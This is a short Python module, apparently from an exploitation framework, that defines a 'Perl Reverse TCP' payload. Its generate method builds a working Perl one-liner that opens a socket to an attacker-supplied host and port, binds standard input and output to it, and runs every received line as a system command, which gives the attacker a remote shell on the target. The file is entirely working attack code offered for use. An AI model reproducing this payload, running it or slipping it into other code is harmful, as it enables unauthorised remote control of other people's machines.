from thg.core.exploit.option import OptString
from thg.core.exploit.payloads import (
    GenericPayload,
    Architectures,
    ReverseTCPPayloadMixin,
)
from thg.modules.encoders.perl.base64 import Encoder


class Payload(ReverseTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Perl Reverse TCP",
        "description": "Creates interactive tcp reverse shell by using perl.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # thg module
        ),
    }

    architecture = Architectures.PERL
    encoder = OptString(Encoder(), "Encoder")

    def generate(self):
        return (
            "use IO;foreach my $key(keys %ENV){" +
            "if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"" +
            self.lhost +
            ":" +
            str(self.lport) +
            "\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};"
        )
